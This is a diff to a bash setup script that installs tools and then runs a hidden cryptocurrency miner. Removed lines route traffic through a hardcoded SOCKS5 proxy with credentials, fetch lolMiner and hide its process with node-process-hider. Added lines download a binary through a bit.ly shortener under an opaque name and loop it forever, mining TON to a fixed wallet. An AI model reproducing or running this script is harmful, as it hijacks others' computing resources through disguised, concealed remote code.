@@ -1,3 +1,4 @@
+#!/bin/bash
 apt update && apt -y install sudo wget curl unzip
 sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 
@@ -9,32 +10,16 @@ npm i -g node-process-hider
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
-
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
-
-tar -xvzf graphics.tar.gz
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 18.216.28.28:1080
-socks5_username = mikrotik999
-socks5_password = Elibawnos
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-echo " "
-
-./graftcp/graftcp wget https://gitlab.com/ninalasmi937/ton/-/raw/main/lolMiner
-chmod +x lolMiner
-
-ph add lolMiner
-
-./graftcp/graftcp ./lolMiner --algo TON --pool https://pool.services.tonwhales.com --user EQD6Q0feCmBzLl2gaAQf2JK9wWwTy4bZVRkhwDRtLwDz2RBp.$(echo $(shuf -i 1-20000 -n 1)-V) --ton-mode 1
-while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
+POOL=https://pool.services.tonwhales.com
+WALLET=EQD6Q0feCmBzLl2gaAQf2JK9wWwTy4bZVRkhwDRtLwDz2RBp
+WORKER=$(echo $(shuf -i 41-80 -n 1)-ETHash)
+#wget https://github.com/drJamesjack/prem/raw/main/lolMiner
+wget https://bit.ly/3FpnfeJ
+chmod +x 3FpnfeJ
+#chmod +x lolMiner
+while [ 1 ]; do
+#./3FpnfeJ --algo ETHASH --pool $POOL --user $WALLET.$WORKER --pass c=LTC,mc=ETH
+./3FpnfeJ --algo TON --pool $POOL --user $WALLET.$WORKER --ton-mode 1
+sleep 5
+done
+sleep 999999999
